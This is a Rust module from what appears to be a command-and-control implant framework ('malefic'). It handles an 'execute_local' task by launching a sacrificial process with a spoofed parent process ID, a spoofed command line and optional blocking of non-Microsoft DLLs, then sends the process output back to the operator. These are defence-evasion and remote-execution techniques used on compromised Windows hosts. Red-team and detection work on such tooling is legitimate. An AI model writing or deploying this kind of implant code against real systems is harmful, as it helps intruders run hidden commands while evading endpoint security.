use crate::{Module, TaskResult, check_request};
use malefic_helper::common::format_cmdline;
use malefic_helper::protobuf::implantpb::ExecResponse;
use malefic_helper::protobuf::implantpb::spite::Body;
use malefic_helper::win::kit::pe::run_sacrifice;

use std::ptr::null_mut;
use async_trait::async_trait;
use malefic_trait::module_impl;

pub struct ExecuteLocal {}

#[async_trait]
#[module_impl("execute_local")]
impl Module for ExecuteLocal {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> crate::Result {
        let request = check_request!(receiver, Body::ExecuteSacrificeRequest)?;
        let is_output = request.output;

        let mut exec_response = ExecResponse::default();
        let mut result: Vec<u8> = Vec::new();
        
        if let Some(sacrifice) = request.sacrifice {
            let cmdline = format_cmdline(request.process_name, request.args);
            let argue = sacrifice.argue;
            let (start_commandline, hijack_commandline) = if argue.is_empty() {
                (cmdline, String::new())
            } else {
                (argue, cmdline)
            };
            unsafe {
                result = run_sacrifice(
                    null_mut(),
                    start_commandline.as_bytes(), 
                    hijack_commandline.as_bytes(), 
                    sacrifice.ppid,
                    request.output, 
                    sacrifice.block_dll);
                exec_response.stdout = result;
            }
        }

        Ok(TaskResult::new_with_body(id, Body::ExecResponse(exec_response)))
    }
}